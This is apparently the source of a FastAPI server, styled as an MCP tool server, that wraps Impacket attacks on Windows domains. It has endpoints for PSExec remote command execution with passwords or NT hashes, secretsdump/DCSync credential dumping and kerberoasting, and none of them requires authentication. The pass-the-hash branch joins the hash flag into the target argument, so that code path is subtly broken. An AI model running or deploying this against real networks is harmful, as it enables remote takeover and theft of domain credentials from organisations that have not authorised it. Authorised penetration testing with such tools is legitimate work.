"""
Impacket MCP Server

FastAPI server for Windows protocol attacks via Impacket.
Supports PSExec, WMI exec, secretsdump, kerberoasting, etc.
"""

import asyncio
from typing import Any

from fastapi import FastAPI
from pydantic import BaseModel, ConfigDict, Field


app = FastAPI(
    title="Impacket MCP Server",
    description="Windows protocol attacks via Impacket",
    version="1.0.0",
)


class PSExecRequest(BaseModel):
    model_config = ConfigDict(extra="ignore")

    target: str = Field(..., description="Target host")
    username: str = Field(..., description="Username")
    password: str = Field("", description="Password")
    nt_hash: str = Field("", description="NT hash for pass-the-hash")
    domain: str = Field("", description="Domain name")
    command: str = Field("whoami", description="Command to execute")
    timeout: int = Field(120, ge=10, le=600)


class SecretsDumpRequest(BaseModel):
    model_config = ConfigDict(extra="ignore")

    target: str = Field(..., description="Target DC")
    username: str = Field(..., description="Username")
    password: str = Field("", description="Password")
    nt_hash: str = Field("", description="NT hash")
    domain: str = Field(..., description="Domain name")
    just_dc: bool = Field(False, description="DCSync only (no SAM/LSA)")
    timeout: int = Field(300, ge=30, le=1800)


class KerberoastRequest(BaseModel):
    model_config = ConfigDict(extra="ignore")

    domain: str = Field(..., description="Target domain")
    dc_ip: str = Field(..., description="Domain controller IP")
    username: str = Field(..., description="Domain username")
    password: str = Field("", description="Password")
    timeout: int = Field(120, ge=10, le=600)


class ImpacketResponse(BaseModel):
    success: bool
    output: str = ""
    error: str | None = None


@app.get("/")
async def root() -> dict[str, str]:
    return {"tool": "impacket", "path": "/tools/psexec", "status": "ok"}


@app.get("/health")
async def health() -> dict[str, str]:
    return {"status": "healthy", "tool": "impacket"}


@app.post("/tools/psexec", response_model=ImpacketResponse)
async def psexec(request: PSExecRequest) -> ImpacketResponse:
    """Execute command via PSExec (Impacket)."""
    try:
        target_str = f"{request.domain}/{request.username}" if request.domain else request.username
        if request.nt_hash:
            target_str += f"@{request.target}" + f" -hashes :{request.nt_hash}"
        else:
            target_str += f":{request.password}@{request.target}"

        cmd = ["impacket-psexec", target_str, request.command]

        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )

        return ImpacketResponse(
            success=process.returncode == 0,
            output=stdout.decode("utf-8", errors="replace")[:10000],
            error=stderr.decode("utf-8", errors="replace")[:2000] if process.returncode != 0 else None,
        )

    except FileNotFoundError:
        return ImpacketResponse(success=False, error="Impacket not installed")
    except Exception as e:
        return ImpacketResponse(success=False, error=str(e)[:500])


@app.post("/tools/secretsdump", response_model=ImpacketResponse)
async def secretsdump(request: SecretsDumpRequest) -> ImpacketResponse:
    """Dump secrets via Impacket secretsdump (DCSync)."""
    try:
        target_str = f"{request.domain}/{request.username}"
        if request.nt_hash:
            target_str += f"@{request.target}" + f" -hashes :{request.nt_hash}"
        else:
            target_str += f":{request.password}@{request.target}"

        cmd = ["impacket-secretsdump", target_str]
        if request.just_dc:
            cmd.append("-just-dc")

        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )

        return ImpacketResponse(
            success=process.returncode == 0,
            output=stdout.decode("utf-8", errors="replace")[:20000],
            error=stderr.decode("utf-8", errors="replace")[:2000] if process.returncode != 0 else None,
        )

    except FileNotFoundError:
        return ImpacketResponse(success=False, error="Impacket not installed")
    except Exception as e:
        return ImpacketResponse(success=False, error=str(e)[:500])


@app.post("/tools/kerberoast", response_model=ImpacketResponse)
async def kerberoast(request: KerberoastRequest) -> ImpacketResponse:
    """Kerberoast attack via Impacket GetUserSPNs."""
    try:
        target_str = f"{request.domain}/{request.username}:{request.password}"
        cmd = [
            "impacket-GetUserSPNs", target_str,
            "-dc-ip", request.dc_ip,
            "-request",
            "-outputfile", "/app/output/kerberoast.txt",
        ]

        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )

        return ImpacketResponse(
            success=process.returncode == 0,
            output=stdout.decode("utf-8", errors="replace")[:10000],
            error=stderr.decode("utf-8", errors="replace")[:2000] if process.returncode != 0 else None,
        )

    except FileNotFoundError:
        return ImpacketResponse(success=False, error="Impacket not installed")
    except Exception as e:
        return ImpacketResponse(success=False, error=str(e)[:500])
